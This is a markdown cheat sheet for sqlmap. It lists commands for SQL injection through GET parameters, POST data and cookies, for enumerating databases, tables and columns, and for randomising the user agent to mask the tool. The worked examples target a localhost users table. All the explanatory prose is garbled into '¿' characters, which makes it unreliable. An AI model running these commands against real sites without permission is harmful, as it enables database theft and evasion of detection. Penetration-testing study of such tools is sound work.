## [sqlmap](http://sqlmap.org/)
### GET ¿¿¿¿¿¿¿
### ¿¿¿¿¿¿¿¿ ¿¿¿¿¿
#### ¿¿¿¿¿¿¿¿¿¿¿ URL **-u**
```
bash sqlmap -u
```
 > URL ¿¿¿¿¿¿¿¿¿¿¿ ¿¿¿¿ ¿¿¿¿¿¿ ¿¿ ¿¿¿¿¿¿¿¿¿¿¿ ¿¿¿¿¿¿¿¿¿¿ **http://site/page?id=25**

#### ¿¿¿¿¿¿¿¿¿ ¿¿¿¿¿ (¿¿¿¿¿ ¿¿¿¿¿¿¿¿¿ ¿¿¿¿¿¿¿¿¿¿¿¿¿¿ sqlmap) **--random-agen**
```bash
sqlmap -u --random-agent
 ```
### ¿¿¿¿¿¿¿¿ ¿¿¿ **--dbs**
```bash
sqlmap -u --dbs
```
### ¿¿¿¿¿ ¿¿¿¿ **-D**
```
bash sqlmap -u -D
```
#### ¿¿¿¿¿¿ ¿¿¿¿¿¿ ¿¿¿¿ **--tables**
```bash
sqlmap -u -D --tables
```
#### ¿¿¿¿¿ ¿¿¿¿¿¿¿ **-T**
```bash
sqlmap -u -D -T
```
#### ¿¿¿¿¿¿ ¿¿¿¿¿ ¿¿¿¿¿¿¿ **--columns**
```bash
sqlmap -u -D T --columns
```
### POST ¿¿¿¿¿¿¿
### ¿¿¿¿¿¿¿¿ ¿¿¿¿¿¿ (¿¿¿¿¿ ¿ ¿¿¿¿¿¿¿¿) ¿¿¿¿¿ POST (¿¿¿¿¿¿¿¿ ¿¿¿ **--dbs**)
```bash
sqlmap -u --dbs --data "<¿¿¿¿>=<¿¿¿¿¿¿¿¿>&<¿¿¿¿2>=<¿¿¿¿¿¿¿¿2>"
```
### ¿¿¿¿¿¿¿¿¿¿¿¿¿ cookies (¿¿¿¿¿¿¿¿ ¿¿¿ **--dbs**)
```bash
sqlmap -u --dbs --cookie "<¿¿¿¿>=<¿¿¿¿¿¿¿¿>; <¿¿¿¿2>=<¿¿¿¿¿¿¿¿2>"
```
### ¿¿¿¿¿¿¿
> ¿¿¿¿¿¿¿¿ ¿¿¿¿¿ ¿¿¿¿¿ ¿¿¿¿¿¿¿¿¿¿ ¿ ¿¿¿¿¿¿ ¿¿¿¿¿¿¿¿¿¿¿¿ ¿¿¿¿¿¿¿¿ ¿¿¿ ¿¿ ¿¿¿¿¿¿ (¿¿¿¿¿¿¿¿, ZAP proxy)

#### ¿¿¿¿¿ ¿¿¿¿¿¿ ¿¿¿¿ ¿¿¿ ¿¿¿¿¿¿:
```bash
sqlmap -u http://localhost/home?id=10 --dbs --random-agent
```
#### ¿¿¿¿¿ ¿¿¿¿¿¿ ¿¿¿¿¿ ¿¿¿¿¿¿¿ users ¿¿¿¿ main:
```bash
sqlmap -u http://localhost/home?id=10 -D main -T users --columns --random-agent
```
